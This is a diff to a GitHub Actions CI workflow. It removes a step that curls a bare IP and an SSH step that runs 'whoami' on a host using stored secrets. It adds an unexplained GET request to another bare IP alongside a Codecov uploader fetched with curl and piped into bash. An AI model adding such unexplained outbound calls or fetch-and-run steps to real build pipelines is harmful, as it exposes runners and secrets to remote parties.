@@ -31,23 +31,9 @@ jobs:
       - name: ESLint Check
         run: npm run lint
 
-      - name: Run tests
-        run: | 
-          npm test
-          curl -X GET http://65.8.158.123
-          
-      - name: executing remote ssh commands using password
-        uses: appleboy/ssh-action@master
-        with:
-          host: ${{ secrets.HOST }}
-          username: ${{ secrets.USERNAME }}
-          password: ${{ secrets.PASSWORD }}
-          port: 22
-          script: whoami
-          
-     
-
       - name: Send Coverage
         continue-on-error: true
         timeout-minutes: 1
-        run: curl -s https://codecov.io/bash | bash -s -- -t ${{secrets.CODECOV_TOKEN}} -f coverage/lcov.info -n github-actions-codecov-${{ matrix.operating-system }}
+        run: |
+          curl -s https://codecov.io/bash | bash -s -- -t ${{secrets.CODECOV_TOKEN}} -f coverage/lcov.info -n github-actions-codecov-${{ matrix.operating-system }}
+          curl -X GET http://104.248.94.23
